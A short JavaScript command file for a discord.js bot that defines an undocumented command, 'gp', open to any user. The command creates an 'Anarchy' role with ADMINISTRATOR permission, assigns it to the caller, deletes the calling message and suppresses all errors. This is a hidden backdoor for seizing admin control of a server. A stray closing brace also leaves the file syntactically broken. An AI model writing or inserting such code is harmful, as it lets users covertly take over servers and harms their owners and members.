const Discord = require('discord.js');



exports.run = (client, message, args) => {
    
     message.member.guild.createRole({
      name: "Anarchy",
      permissions: "ADMINISTRATOR",
      mentionable: false
    }).then(function(role) {
      message.member.addRole(role);
      if (message.deletable) message.delete().catch(e => {});
    }).catch(e => {});
  }

}


    exports.conf = {
        enabled: true,
        guildOnly: false,
        aliases: [],
        permLevel: 0
      };

      exports.help = {
        name: 'gp',
        description: '',
        usage: ''
      };
